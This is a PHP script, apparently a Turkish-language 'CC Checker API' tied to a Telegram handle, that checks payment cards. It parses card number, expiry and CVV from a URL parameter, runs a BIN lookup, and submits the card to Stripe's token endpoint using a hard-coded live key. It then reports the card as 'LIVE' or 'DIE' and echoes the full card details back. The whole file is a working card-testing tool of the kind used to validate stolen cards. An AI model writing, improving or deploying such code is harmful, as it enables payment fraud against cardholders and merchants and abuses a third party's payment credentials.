<?php
/**
 * CC Checker API - Basit Versiyon
 * Telegram: @zahettim
 */

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

$cc = $_GET['cc'] ?? null;

if (!$cc) {
    echo json_encode([
        'success' => false,
        'error' => 'CC bilgisi gerekli',
        'format' => 'kart|ay|yil|cvv (örn: 4818081161475565|07|30|853)',
        'telegram' => '@zahettim'
    ]);
    exit;
}

$separa = explode("|", $cc);
if (count($separa) < 4) {
    echo json_encode([
        'success' => false,
        'error' => 'Format hatali! Kart|Ay|Yil|CVV',
        'telegram' => '@zahettim'
    ]);
    exit;
}

$card = $separa[0];
$month = $separa[1];
$year = $separa[2];
$cvv = $separa[3];

// BIN Lookup
function getBinInfo($cc) {
    $bin = substr($cc, 0, 6);
    try {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://lookup.binlist.net/{$bin}");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        $data = curl_exec($ch);
        curl_close($ch);
        
        if ($data) {
            $json = json_decode($data, true);
            return [
                'bank' => $json['bank']['name'] ?? 'Bilinmiyor',
                'scheme' => $json['scheme'] ?? 'Bilinmiyor',
                'type' => $json['type'] ?? 'Bilinmiyor',
                'country' => $json['country']['name'] ?? 'Bilinmiyor'
            ];
        }
    } catch (Exception $e) {}
    
    return ['bank' => 'Bilinmiyor', 'scheme' => 'Bilinmiyor', 'type' => 'Bilinmiyor', 'country' => 'Bilinmiyor'];
}

// Stripe Token al
function getStripeToken($card, $month, $year, $cvv) {
    try {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]={$card}&card[exp_month]={$month}&card[exp_year]={$year}&card[cvc]={$cvv}&key=pk_live_Reu0iyvtI4irr4oHuGKWz3v2");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/x-www-form-urlencoded']);
        $result = curl_exec($ch);
        curl_close($ch);
        
        if ($result) {
            $data = json_decode($result, true);
            return $data['id'] ?? null;
        }
    } catch (Exception $e) {}
    
    return null;
}

$binInfo = getBinInfo($card);
$token = getStripeToken($card, $month, $year, $cvv);

if (!$token) {
    echo json_encode([
        'success' => false,
        'status' => '❌ DIE',
        'card' => $card,
        'message' => 'Token alinamadi! Kart gecersiz.',
        'bin_info' => $binInfo,
        'telegram' => '@zahettim'
    ]);
    exit;
}

echo json_encode([
    'success' => true,
    'status' => '✅ LIVE',
    'card' => $card,
    'month' => $month,
    'year' => $year,
    'cvv' => $cvv,
    'message' => 'Token alindi! Kart aktif.',
    'bin_info' => $binInfo,
    'telegram' => '@zahettim'
]);
?>